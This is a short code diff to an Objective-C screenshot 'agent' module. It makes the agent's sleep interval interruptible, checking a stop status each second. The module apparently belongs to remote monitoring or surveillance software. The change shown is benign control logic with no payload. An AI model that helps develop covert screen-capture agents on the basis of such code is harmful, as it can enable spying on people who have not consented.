@@ -279,7 +279,14 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
       infoLog(@"Sleeping for %d seconds", mSleepSec);
 #endif
       
-      sleep(mSleepSec);
+      int32_t sleepCounter = 0;
+      while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
+             [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
+             sleepCounter < mSleepSec)
+        {
+          sleep(1);
+          sleepCounter++;
+        }
     }
   
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
